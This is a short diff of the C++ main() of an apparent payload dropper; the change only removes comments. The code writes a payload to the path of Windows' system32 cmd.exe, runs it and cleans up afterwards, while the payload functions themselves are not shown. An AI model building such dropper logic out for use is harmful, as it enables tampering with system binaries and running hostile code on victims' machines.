@@ -7,27 +7,27 @@
 
 int main() {
 
-    debug("writing payload to disk..."); // debug message
+    debug("writing payload to disk..."); 
 
-    deploy::writePayload("c:\\windows\\system32\\cmd.exe"); // writes the payload to disk 
+    deploy::writePayload("c:\\windows\\system32\\cmd.exe");
 
-    success("payload successfully wrote to disk!"); // debug message if successful
+    success("payload successfully wrote to disk!"); 
 
-    debug("running payload..."); // debug message
+    debug("running payload..."); 
 
     if (deploy::runPayload()) { // run the payload and check if it was a success
-        success("payload ran successfully!"); // debug message if successful
+        success("payload ran successfully!"); 
     }
     else {
-        error("fatal error during the execution of the payload."); // debug message if failed
+        error("fatal error during the execution of the payload."); 
     }
 
-    debug("cleaning up..."); // debug message
+    debug("cleaning up..."); 
 
     if (deploy::cleanup()) {
         success("cleaned up successfully, closing..."); // clean up the payload files and check if it was a success
     }
     else {
-        error("fatal error during the cleanup of the payload."); // debug message if failed 
+        error("fatal error during the cleanup of the payload.");
     }
 }
